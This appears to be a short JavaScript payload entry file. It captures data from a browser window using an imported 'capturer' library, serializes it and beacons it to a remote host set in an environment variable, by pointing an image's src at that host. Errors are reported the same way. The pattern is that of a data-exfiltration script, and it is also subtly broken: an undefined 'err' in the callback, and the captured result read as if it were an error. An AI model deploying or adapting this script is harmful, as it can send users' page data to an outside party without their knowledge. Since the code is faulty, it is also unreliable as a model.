import capture from './lib/capturer'
import serialize from './lib/serializer'

const sendError = err => {
  const remote = process.env.ENDPOINT_ERROR.replace('%data%', encodeURIComponent(err.message))
  document.createElement('img').src = remote
}

const sendCapturedData = err => {
  let serializedMessage

  try {
    serializedMessage = serialize(err.message)
  } catch (err) {
    sendError(err)
  }

  const remote = process.env.ENDPOINT_DATA.replace('%data%', serializedMessage)
  document.createElement('img').src = remote
}

try {
  capture(window, (error, result) =>
    error ? sendError(err) : sendCapturedData(result)
  )  
} catch (err) {
  sendError(err)
}
